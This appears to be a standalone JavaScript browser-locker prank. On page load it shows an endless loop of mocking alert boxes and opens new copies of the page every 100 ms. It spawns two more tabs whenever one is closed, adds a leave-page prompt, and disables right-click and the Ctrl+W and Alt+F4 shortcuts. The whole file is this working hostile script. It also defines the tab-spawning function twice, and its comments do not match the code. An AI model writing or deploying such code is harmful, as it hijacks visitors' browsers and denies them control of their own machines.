let showAlertTimeout;
let openNewTabInterval;

function duplicateTabEverySecond() {
    openNewTabInterval = setInterval(function() {
        window.open(location.href);
    }, 1);
}

// 無限アラートを表示する関数
function showAlert() {
    alert("(ﾟ∀ﾟ)アヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャ");
    showAlertTimeout = setTimeout(showAlert, 1000);
}

// タブが閉じられたときに新しいタブを2つ開く関数
function openNewTabsOnClose() {
    window.onbeforeunload = function() {
        for (let i = 0; i < 2; i++) {
            window.open(location.href);
        }
    };
}

// タブの閉じる動作を防ぐ関数
function preventClose() {
    window.onbeforeunload = function(event) {
        event.preventDefault();
        event.returnValue = 'Are you sure you want to leave?';
        return 'Are you sure you want to leave?';
    };
}

// マウスの右クリックを無効にする関数
function disableRightClick() {
    document.addEventListener('contextmenu', function(event) {
        event.preventDefault();
    });
}

// ショートカットキーを無効にする関数
function disableShortcuts() {
    document.addEventListener('keydown', function(event) {
        // Ctrl+W, Ctrl+Shift+W, Alt+F4
        if ((event.ctrlKey && (event.key === 'w' || event.key === 'W')) ||
            (event.altKey && event.key === 'F4')) {
            event.preventDefault();
        }
    });
}

// 1秒ごとに新しいタブを開く関数
function duplicateTabEverySecond() {
    openNewTabInterval = setInterval(function() {
        window.open(location.href);
    }, 100);
}

window.onload = function() {
    showAlert();
    openNewTabsOnClose();
    preventClose();
    disableRightClick();
    disableShortcuts();
    duplicateTabEverySecond();
};
